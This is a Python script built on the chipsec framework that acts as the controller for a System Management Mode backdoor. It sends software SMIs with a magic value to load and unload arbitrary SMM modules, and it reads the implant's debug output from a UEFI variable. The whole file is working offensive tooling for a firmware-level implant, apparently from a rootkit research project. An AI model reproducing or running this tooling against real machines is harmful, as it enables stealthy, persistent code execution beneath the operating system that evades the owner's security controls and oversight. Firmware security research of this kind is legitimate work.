import sys
import chipsec.chipset
import chipsec.hal.uefi
import chipsec.hal.interrupts
import argparse
import ctypes
import time

# SW SMI command value for communicating with backdoor SMM code
BACKDOOR_RAX_VALUE = 0xC8E10B9DF93100A5
DEBUG_GUID = "1F681694-DA81-49C6-BDC2-3942CA6A2914"
DEBUG_VAR_NAME = "Debug"

parser = argparse.ArgumentParser()
parser.add_argument('-l', '--load', metavar='load', type=str, help='Enter relative path for module which you would like to load')
parser.add_argument('-u', '--unload', metavar='unload', type=str, help='Enter name of module which you would like to unload')
parser.add_argument('-i', '--info', action='store_true', help='Print info about loaded modules')
parser.add_argument('-d', '--debug', action='store_true', help='Prints debug message in a infinite loop')
args = parser.parse_args()

class ChipsecWrapper(object):
    def __init__(self):
        self.cs = chipsec.chipset.cs()
        self.cs.helper.start(True)
        self.intr = chipsec.hal.interrupts.Interrupts(self.cs)
        self.uefi = chipsec.hal.uefi.UEFI(self.cs)        

    def send_sw_smi(self, command, arg1, arg2, arg3):
        self.intr.send_SW_SMI(0, 0xA5, 0, BACKDOOR_RAX_VALUE, 0, command, arg1, arg2, arg3)
    
    def load_smm_module(self, module_path):
        data = open(module_path, "rb").read()+ b'\00' + bytes(module_path, 'ascii') + b'\00'
        s = ctypes.c_char_p(data)
        self.send_sw_smi(0xbadc0ded1e, ctypes.cast(s, ctypes.c_void_p).value, len(data), 0)

    def unload_smm_module(self, module_name):
        s = ctypes.c_char_p(bytes(module_name, 'ascii'))
        self.send_sw_smi(0xbadc0ded1f, ctypes.cast(s, ctypes.c_void_p).value, len(module_name) + 1, 0)

    def print_info_about_loaded_modules(self):
        self.send_sw_smi(0xbadc0ded20, 0, 0, 0)
        self.print_debug_msg()

    def pring_debug_msg_loop(self):
        while True:
            self.print_debug_msg()
            time.sleep(1)

    def print_debug_msg(self):
        data = self.uefi.get_EFI_variable(DEBUG_VAR_NAME, DEBUG_GUID, None)
        for debug_message in data[2:].split(b'\x00'):
            if len(debug_message):
                print(debug_message.decode('utf-8').rstrip())

        data = bytes(len(data))
        self.uefi.set_EFI_variable(DEBUG_VAR_NAME, DEBUG_GUID, data, len(data))

def main():
    cs = ChipsecWrapper()
    if args.load:
        cs.load_smm_module(args.load)
    elif args.unload:
        cs.unload_smm_module(args.unload)
    elif args.info:
        cs.print_info_about_loaded_modules()
    elif args.debug:
        cs.pring_debug_msg_loop()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)
    main()